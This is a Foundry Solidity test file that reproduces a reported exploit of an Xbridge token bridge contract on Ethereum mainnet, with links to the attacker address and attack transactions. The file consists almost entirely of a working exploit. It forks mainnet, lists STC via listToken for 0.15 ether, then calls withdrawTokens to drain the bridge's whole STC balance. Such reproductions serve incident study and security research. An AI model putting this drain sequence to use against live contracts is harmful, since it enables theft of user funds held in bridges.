// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~$1.6M(https://debank.com/profile/0x0cfc28d16d07219249c6d6d6ae24e7132ee4caa7, >200k USD(plus a lot of STC, SRLTY, Mazi tokens))
// Attacker : https://etherscan.io/address/0x0cfc28d16d07219249c6d6d6ae24e7132ee4caa7
// Vulnerable Contract : https://etherscan.io/address/0x354cca2f55dde182d36fe34d673430e226a3cb8c#code
// Attack Tx Step1(deposit) : https://etherscan.io/tx/0xe09d350d8574ac1728ab5797e3aa46841f6c97239940db010943f23ad4acf7ae
// Attack Tx Step2(withdrawToken): https://etherscan.io/tx/0x903d88a92cbc0165a7f662305ac1bff97430dbcccaa0fe71e101e18aa9109c92

// @Analysis
// https://twitter.com/CyversAlerts/status/1783045506471432610

interface IXbridge {
    struct tokenInfo {
        address token;
        uint256 chain;
    }
    function listToken(tokenInfo memory baseToken, tokenInfo memory correspondingToken, bool _isMintable) external payable;
    function withdrawTokens(address token, address receiver, uint256 amount) external; 

}


contract ContractTest is Test {

    IERC20 STC = IERC20(0x19Ae49B9F38dD836317363839A5f6bfBFA7e319A);
    IXbridge xbridge = IXbridge(0x47Ddb6A433B76117a98FBeAb5320D8b67D468e31);

    function setUp() public {
        vm.createSelectFork("mainnet", 19723701 - 1);
    }

    function testExploit() public {
        // First TX
        deal(address(this), 0.15 ether);
        emit log_named_decimal_uint(
            "Exploiter STC balance before attack",
            STC.balanceOf(address(this)),
            9
        );

        IXbridge.tokenInfo memory base = IXbridge.tokenInfo(address(STC), 85936);
        IXbridge.tokenInfo memory corr = IXbridge.tokenInfo(address(STC), 95838);

        xbridge.listToken{value: 0.15 ether}(base, corr, false);

        xbridge.withdrawTokens(address(STC), address(this), STC.balanceOf(address(xbridge)));

        emit log_named_decimal_uint(
            "Exploiter STC balance after attack",
            STC.balanceOf(address(this)),
            9
        );

    }

    receive() external payable {}

}


